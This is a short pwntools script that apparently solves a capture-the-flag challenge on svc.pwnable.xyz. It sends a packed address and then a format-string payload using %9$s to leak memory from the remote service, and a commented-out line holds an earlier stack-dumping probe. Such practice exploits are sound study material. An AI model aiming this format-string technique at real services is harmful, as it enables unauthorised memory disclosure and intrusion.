from pwn import *

r = remote("svc.pwnable.xyz", 30004)

r.sendlineafter("[y/N]: ", "yAAABBBB" + p32(0x601080))

#r.sendlineafter("Name: ", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lxA")
r.sendlineafter("Name: ", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%9$sAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")

r.interactive()

r.close()

